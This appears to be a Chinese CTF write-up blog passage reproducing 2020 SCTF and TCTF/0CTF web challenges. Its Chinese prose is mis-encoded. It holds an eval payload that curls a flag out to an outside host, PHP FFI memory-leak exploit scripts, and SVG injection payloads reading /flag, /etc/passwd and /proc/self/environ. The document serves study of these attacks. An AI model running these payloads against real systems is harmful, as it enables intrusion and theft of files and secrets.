<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?a&#x3D;__import__(&#39;os&#39;).system(&#39;curl+http%3a&#x2F;&#x2F;ccreater.top%3a60000&#x2F;+-d+&#96;cat+flag|base64&#96;&#39;) HTTP&#x2F;1.1</span><br><span class="line">Host: 39.104.90.30:10006</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36</span><br><span class="line">Accept: image&#x2F;webp,image&#x2F;apng,image&#x2F;*,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Referer: http:&#x2F;&#x2F;39.104.90.30:10006&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;cmd&quot;</span><br><span class="line"></span><br><span class="line">request.args.__class__.__getattr__&#x3D;request.args.__class__.__getitem__;app.config.__class__.__eq__&#x3D;eval;app.config&#x3D;&#x3D;request.args.a;</span><br><span class="line">------WebKitFormBoundaryx3B8HB5b--</span><br></pre></td></tr></table></figure>

<p><code>__getattr__</code>:</p>
<p><code>__getitem__</code>:</p>
<p><code>__eq__</code>:</p>
</blockquote>
<h1 id="0x04-bestlanguage"><a href="#0x04-bestlanguage" class="headerlink" title="0x04 bestlanguage"></a>0x04 bestlanguage</h1><p>è·¯ç”±ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#routes/web.php</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'/'</span>,<span class="string">"IndexController@init"</span>);</span><br><span class="line">Route::post(<span class="string">'/rm'</span>,<span class="string">"IndexController@rm"</span>);</span><br><span class="line">Route::get(<span class="string">'/tmp/&#123;filename&#125;'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    readfile(<span class="string">"/var/tmp/"</span>.$filename);</span><br><span class="line">&#125;)-&gt;where(<span class="string">'filename'</span>, <span class="string">'(.*)'</span>);</span><br><span class="line">Route::post(<span class="string">'/upload'</span>,<span class="string">"IndexController@upload"</span>);</span><br><span class="line">Route::get(<span class="string">'/move/log/&#123;filename&#125;'</span>, <span class="string">'IndexController@moveLog'</span>)-&gt;where(<span class="string">'filename'</span>, <span class="string">'(.*)'</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#\App\Http\Controllers\IndexController.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span> &amp;&amp; strpos($_SERVER[<span class="string">"REMOTE_ADDR"</span>],<span class="string">"192.168."</span>) !== <span class="number">0</span> &amp;&amp; strpos($_SERVER[<span class="string">"REMOTE_ADDR"</span>],<span class="string">"10."</span>) !== <span class="number">0</span> )  &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"admin only"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])))&#123;</span><br><span class="line">            mkdir(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_POST[<span class="string">"filename"</span>], <span class="string">'../'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">"???"</span>);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]))&#123;</span><br><span class="line">                rmdir(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"rmdir"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                unlink(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"unlink"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos($_POST[<span class="string">"filename"</span>], <span class="string">'../'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">"???"</span>);</span><br><span class="line">        file_put_contents(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">"/"</span>.$_POST[<span class="string">"filename"</span>],base64_decode($_POST[<span class="string">"content"</span>]));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">"/"</span>.$_POST[<span class="string">"filename"</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveLog</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        $data =date(<span class="string">"Y-m-d"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data))&#123;</span><br><span class="line">            mkdir(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data);</span><br><span class="line">        &#125;</span><br><span class="line">        $opts = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'http'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'method'</span>=&gt;<span class="string">"GET"</span>,</span><br><span class="line">                <span class="string">'timeout'</span>=&gt;<span class="number">1</span>,<span class="comment">//å•ä½ç§’</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents(<span class="string">"http://127.0.0.1/tmp/"</span>.md5(<span class="string">'127.0.0.1'</span>).<span class="string">"/"</span>.$filename,<span class="keyword">false</span>,stream_context_create($opts));</span><br><span class="line">        file_put_contents(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data.<span class="string">"/"</span>.$filename,$content);</span><br><span class="line">        <span class="keyword">echo</span> storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data.<span class="string">"/"</span>.$filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708174824735.png" alt="image-20200708174824735"></p>
<p>ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¿™é‡Œéœ€è¦åŠ ä¸Šindex.phpã€‚å¦åˆ™ä¸ä¼šæˆåŠŸã€‚</p>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708174534642.png" alt="image-20200708174534642"></p>
<h1 id="0x05-Login-Me"><a href="#0x05-Login-Me" class="headerlink" title="0x05 Login Me"></a>0x05 Login Me</h1><p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708211540390.png" alt="image-20200708211540390"></p>
<h1 id="0X06-Login-Me-Aagin"><a href="#0X06-Login-Me-Aagin" class="headerlink" title="0X06 Login Me Aagin"></a>0X06 Login Me Aagin</h1><p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708211553620.png" alt="image-20200708211553620"></p>
]]></content>
  </entry>
  <entry>
    <title>2020 TCTF0CTF Webé¢˜ç›®å¤ç°</title>
    <url>/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>TCTFå‡ é“Webé¢˜ç›®å¤ç°</p>
<a id="more"></a>

<h1 id="0x01-easyphp-amp-noteasyphp"><a href="#0x01-easyphp-amp-noteasyphp" class="headerlink" title="0x01 easyphp&amp;noteasyphp"></a>0x01 easyphp&amp;noteasyphp</h1><p>é™åˆ¶äº†disable_functionå’Œopenbase_dir.</p>
<p>é¦–å…ˆå¯ä»¥åˆ©ç”¨globæ¥åˆ—æ ¹ç›®å½•</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707123003919.png" alt="image-20200707123003919"></p>
<p>è¯»ä¸äº†æ–‡ä»¶ï¼Œçœ‹phpinfoå¼€äº†FFIæ‰©å±•ï¼Œå‚è€ƒé£˜é›¶å¸ˆå‚…å’ŒCJm00nå¸ˆå‚…çš„åšå®¢ï¼Œé¢˜ç›®éœ€è¦åˆ©ç”¨FFIçš„memcpyæ¥æ³„éœ²å†…å­˜ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//php ffiæ•è·å¼‚å¸¸</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	$ffi = FFI::cdef(<span class="string">"int test()"</span>,);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(FFI\<span class="keyword">Exception</span> $ex)&#123;</span><br><span class="line">	<span class="keyword">echo</span> $ex-&gt;getMessage(),PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707144552484.png" alt="image-20200707144552484"></p>
<p>é¢˜ç›®ç¦æ­¢äº†cdefã€‚ç„¶åå»çœ‹çœ‹FFI<a href="https://www.php.net/manual/zh/book.ffi.php" target="_blank" rel="noopener">çš„å…¶ä»–å‡½æ•°</a>ï¼Œ</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707144702756.png" alt="image-20200707144702756"></p>
<ul>
<li><p>load():å¯ä»¥ä»Cçš„å¤´æ–‡ä»¶åŠ è½½Cå£°æ˜ã€‚</p>
</li>
<li><p>new():åˆ›å»ºä¸€ä¸ªCæ•°æ®ç»“æ„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°æ®ç±»å‹ï¼Œç¬¬äºŒä¸ªå‚æ•°å¯ä»¥ç¡®å®šæ˜¯åˆ›å»ºæ‹¥æœ‰ï¼ˆå³æ‰˜ç®¡ï¼‰æ•°æ®è¿˜æ˜¯éæ‰˜ç®¡æ•°æ®ã€‚ æ‰˜ç®¡æ•°æ®ä¸è¿”å›çš„FFI \ CDataå¯¹è±¡ä¸€èµ·å­˜åœ¨ï¼Œå¹¶åœ¨é€šè¿‡å¸¸è§„PHPå¼•ç”¨è®¡æ•°æˆ–GCé‡Šæ”¾å¯¹è¯¥å¯¹è±¡çš„æœ€åä¸€ä¸ªå¼•ç”¨æ—¶é‡Šæ”¾ã€‚ å½“ä¸å†éœ€è¦æ—¶ï¼Œåº”é€šè¿‡è°ƒç”¨FFI :: freeï¼ˆï¼‰é‡Šæ”¾éæ‰˜ç®¡æ•°æ®ã€‚è‹¥ä¸ºfalseï¼Œå³ä¸ä¼šè‡ªåŠ¨freeã€‚</p>
</li>
<li><p>memcpy():å°†sizeå¤§å°çš„å­—èŠ‚ä»å†…å­˜åŒºåŸŸsrcå¤åˆ¶åˆ°å†…å­˜åŒºåŸŸdstã€‚</p>
</li>
<li><p>string():ä»å†…å­˜åŒºåŸŸåˆ›å»ºPHPå­—ç¬¦ä¸²ã€‚</p>
</li>
<li><p>arrayType():åŠ¨æ€æ„é€ ä¸€ä¸ªæ–°çš„Cæ•°ç»„ç±»å‹ï¼Œå…¶å…ƒç´ ç±»å‹ç”±ç±»å‹å®šä¹‰ï¼Œç»´æ•°ç”±ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šã€‚</p>
</li>
</ul>
<p>æ³„éœ²çš„æ­¥éª¤ï¼š</p>
<ol>
<li>é¦–å…ˆåŠ è½½flag.h</li>
<li>å¼€è¾Ÿä¸€ä¸ªå­˜æ”¾å­—ç¬¦æ•°ç»„çš„ç©ºé—´ï¼Œä¿å­˜é¦–å…ƒç´ çš„åœ°å€ã€‚</li>
<li>å¼€è¾Ÿä¸€ä¸ªç”¨æ¥å­˜æ”¾å¤åˆ¶å†…å®¹çš„ç©ºé—´ï¼Œä¿å­˜é¦–å…ƒç´ çš„ç©ºé—´ã€‚</li>
<li>å°†ç­‰2æ­¥å¾—åˆ°çš„åœ°å€å‘å‰æ¨ä¸€ä¸ªå¤§çš„èŒƒå›´ï¼Œå¤åˆ¶åˆ°ç¬¬3æ­¥å¾—åˆ°çš„åœ°å€ä¸­ã€‚</li>
<li>åˆ©ç”¨stringå°†å¤åˆ¶çš„å†…å®¹å˜æˆå­—ç¬¦ä¸²ï¼Œæ‰“å°å‡ºæ¥ã€‚</li>
</ol>
<blockquote>
<p>cjm00n</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;pwnable.org:19261&#x2F;&quot;</span><br><span class="line">sess &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line"> param &#x3D; &#123;</span><br><span class="line">     &quot;rh&quot;:</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">try &#123;</span><br><span class="line"> $ffi&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);</span><br><span class="line"> $a &#x3D; $ffi-&gt;new(&quot;char[8]&quot;, false); </span><br><span class="line"> $leak &#x3D; FFI::new(FFI::arrayType(FFI::type(&#39;char&#39;), [102400]), false);</span><br><span class="line"> FFI::memcpy($leak, $a-0x24000, 102400);</span><br><span class="line"> $tmp &#x3D; FFI::string($leak,102400);</span><br><span class="line"> var_dump($tmp);</span><br><span class="line">&#125; catch (FFI\Exception $ex) &#123;</span><br><span class="line"> echo $ex-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"> &#125;</span><br><span class="line"> resp &#x3D; sess.get(url, params&#x3D;param).text</span><br><span class="line"> print(resp)</span><br><span class="line"> open(&quot;out&quot;, &quot;w&quot;, encoding&#x3D;&quot;utf-8&quot;).write(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line"> exp()</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707144913364.png" alt="image-20200707144913364"></p>
<p>è¿è¡Œå‡½æ•°è·å¾—flagã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ffi=FFI::load(<span class="string">"/flag.h"</span>);</span><br><span class="line">    $a =($ffi-&gt;flag_fUn3t1on_fFi());</span><br><span class="line">    var_dump(FFI::string($a,<span class="number">50</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (FFI\<span class="keyword">Exception</span> $ex) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $ex-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707152953562.png" alt="image-20200707152953562"></p>
<blockquote>
<p>nu1l</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$flag&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);$char&#x3D;$flag-&gt;new(&quot;char[0x30]&quot;,false);$char&#x3D;FFI::addr($char);FFI::free($char);$loadflag&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);print_r($char);</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>sky</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;pwnable.org:19261&quot;</span><br><span class="line">params &#x3D; &#123;&quot;rh&quot;:</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">try &#123;</span><br><span class="line"> $ffi&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);</span><br><span class="line"> &#x2F;&#x2F;get flag</span><br><span class="line"> &#x2F;&#x2F;$a &#x3D; $ffi-&gt;flag_wAt3_uP_apA3H1();</span><br><span class="line"> &#x2F;&#x2F;for($i &#x3D; 0; $i &lt; 128; $i++)&#123;</span><br><span class="line">     echo $a[$i];</span><br><span class="line"> &#x2F;&#x2F;&#125;</span><br><span class="line"> $a &#x3D; $ffi-&gt;new(&quot;char[8]&quot;, false);</span><br><span class="line"> $a[0] &#x3D; &#39;f&#39;;</span><br><span class="line"> $a[1] &#x3D; &#39;l&#39;;</span><br><span class="line"> $a[2] &#x3D; &#39;a&#39;;</span><br><span class="line"> $a[3] &#x3D; &#39;g&#39;;</span><br><span class="line"> $a[4] &#x3D; &#39;f&#39;;</span><br><span class="line"> $a[5] &#x3D; &#39;l&#39;;</span><br><span class="line"> $a[6] &#x3D; &#39;a&#39;;</span><br><span class="line"> $a[7] &#x3D; &#39;g&#39;;</span><br><span class="line"> $b &#x3D; $ffi-&gt;new(&quot;char[8]&quot;, false);</span><br><span class="line"> $b[0] &#x3D; &#39;f&#39;;</span><br><span class="line"> $b[1] &#x3D; &#39;l&#39;;</span><br><span class="line"> $b[2] &#x3D; &#39;a&#39;;</span><br><span class="line"> $b[3] &#x3D; &#39;g&#39;;</span><br><span class="line"> $newa &#x3D; $ffi-&gt;cast(&quot;void*&quot;, $a);</span><br><span class="line"> var_dump($newa);</span><br><span class="line"> $newb &#x3D; $ffi-&gt;cast(&quot;void*&quot;, $b);</span><br><span class="line"> var_dump($newb);</span><br><span class="line"> </span><br><span class="line"> $addr_of_a &#x3D; FFI::new(&quot;unsigned long long&quot;);</span><br><span class="line"> FFI::memcpy($addr_of_a, FFI::addr($newa), 8);</span><br><span class="line"> var_dump($addr_of_a);</span><br><span class="line"> </span><br><span class="line"> $leak &#x3D; FFI::new(FFI::arrayType($ffi-&gt;type(&#39;char&#39;), [102400]), false);</span><br><span class="line"> FFI::memcpy($leak, $newa-0x20000, 102400);</span><br><span class="line"> $tmp &#x3D; FFI::string($leak,102400);</span><br><span class="line"> var_dump($tmp);</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F;var_dump($leak);</span><br><span class="line"> &#x2F;&#x2F;$leak[0] &#x3D; 0xdeadbeef;</span><br><span class="line"> &#x2F;&#x2F;$leak[1] &#x3D; 0x61616161;</span><br><span class="line"> &#x2F;&#x2F;var_dump($a);</span><br><span class="line"> &#x2F;&#x2F;FFI::memcpy($newa-0x8, $leak, 128*8);</span><br><span class="line"> &#x2F;&#x2F;var_dump($a);</span><br><span class="line"> &#x2F;&#x2F;var_dump(777);</span><br><span class="line">&#125; catch (FFI\Exception $ex) &#123;</span><br><span class="line"> echo $ex-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(1);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(url&#x3D;url,params&#x3D;params)</span><br><span class="line"></span><br><span class="line">print((res.text).encode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<p>éé¢„æœŸ</p>
<p><a href="https://ctftime.org/task/12159" target="_blank" rel="noopener">https://ctftime.org/task/12159</a></p>
</blockquote>
<h1 id="0x02-Wechat-Generator"><a href="#0x02-Wechat-Generator" class="headerlink" title="0x02 Wechat Generator"></a>0x02 Wechat Generator</h1><p>æœ‰ä¸¤ä¸ªè·¯ç”±ï¼Œåˆ†åˆ«æ—¶/shareå’Œ/preview</p>
<p>å¯ä»¥è¾“å…¥æ¶ˆæ¯ï¼Œç‚¹å‡»previewï¼Œå¾—åˆ°é¢„è§ˆç•Œé¢ã€‚ç‚¹å‡»shareï¼Œè·³åˆ°ä¸€ä¸ªåˆ†äº«å›¾ç‰‡çš„é“¾æ¥ã€‚</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703234622195.png" alt="image-20200703234622195"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703234741264.png" alt="image-20200703234741264"></p>
<p>ç„¶åè®¿é—®è¿™ä¸ªå›¾ç‰‡ï¼Œ<a href="http://pwnable.org:5000/image/tAWfUu/png" target="_blank" rel="noopener">http://pwnable.org:5000/image/tAWfUu/png</a></p>
<p>å°†åé¢çš„pngæ”¹æˆhtmæˆ–svgå¯ä»¥å¾—åˆ°<a href="http://pwnable.org:5000/image/tAWfUu/svg" target="_blank" rel="noopener">http://pwnable.org:5000/image/tAWfUu/svg</a></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703235629001.png" alt="image-20200703235629001"></p>
<p>ç„¶ååœ¨å‘é€è¡¨æƒ…åŒ…çš„æ—¶å€™å‘ç°å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: pwnable.org:5000</span><br><span class="line">Content-Length: 46</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Origin: http:&#x2F;&#x2F;pwnable.org:5000</span><br><span class="line">Referer: http:&#x2F;&#x2F;pwnable.org:5000&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Mount4in [smile]&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703235518881.png" alt="image-20200703235518881"></p>
<p>ä¹‹åå‘ç°å¯ä»¥åœ¨smileåé¢åŠ ä¸ŠåŒå¼•å·é—­åˆå‰é¢ï¼Œç„¶ååˆ©ç”¨ä½¿ç”¨ <code>xlink:href</code>è¯»æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;flag\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234459101.png" alt="image-20200702234459101"></p>
<p>æ˜¾ç¤ºGood job</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234535125.png" alt="image-20200702234535125"></p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[smile.png&quot;&#x2F;&gt;&lt;image width&#x3D;&quot;1200&quot; height&#x3D;&quot;1200&quot; href&#x3D;&quot;text:&#x2F;etc&#x2F;passwd&quot;&#x2F;&gt; &lt;image href&#x3D;&quot;x]</span><br></pre></td></tr></table></figure>

<p><a href="https://oioki.me/2020/07/0ctf-tctf-2020-quals/è¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥è¯»æ–‡ä»¶" target="_blank" rel="noopener">https://oioki.me/2020/07/0ctf-tctf-2020-quals/è¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥è¯»æ–‡ä»¶</a></p>
</blockquote>
<p>ä¹‹åè¯»/proc/self/environ,å‘ç°æœ‰è¿‡æ»¤ï¼ŒåŒå†™å¯ä»¥ç»•è¿‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;proc&#x2F;self&#x2F;environ\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234657290.png" alt="image-20200702234657290"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;prprococ&#x2F;self&#x2F;enenvviron\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234859538.png" alt="image-20200702234859538"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235047336.png" alt="image-20200702235047336"></p>
<p>ç»§ç»­è¯»/proc/self/maps</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;prprococ&#x2F;self&#x2F;maps\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235153918.png" alt="image-20200702235153918"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235414315.png" alt="image-20200702235414315"></p>
<p>ä¹‹åè¯»/app/app.py</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235556740.png" alt="image-20200702235556740"></p>
<p>çœ‹åˆ°/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0wsè·¯ç”±ï¼Œéœ€è¦alert(1)æ‰å¯ä»¥è¯»åˆ°flagï¼Œæœ‰CSPå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</span><br></pre></td></tr></table></figure>

